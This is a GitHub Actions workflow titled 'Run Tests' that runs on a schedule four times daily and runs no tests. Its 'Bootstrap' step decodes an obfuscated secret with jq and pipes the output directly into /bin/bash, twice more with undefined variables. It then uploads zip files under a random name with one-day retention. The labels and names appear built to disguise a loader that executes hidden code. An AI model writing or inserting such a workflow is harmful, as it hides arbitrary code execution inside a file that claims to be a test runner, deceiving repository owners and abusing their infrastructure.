name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '15 3,9,15,21 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  deploy:
    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Bootstrap
        env:
          kdh4: ${{ secrets.kdh4 }}
        run: |
          printf '%s' "$kdh4" | jq -r .aouo9 | /bin/bash
          printf '%s' "$tl50" | jq -r .zkepd12 | /bin/bash
          echo $ymq581 | jq -r .fyi629 | /bin/bash

      - name: Archive artifact
        uses: actions/upload-artifact@v4
        with:
          name: jBFG8qXS
          path: "*.zip"
          retention-days: 1
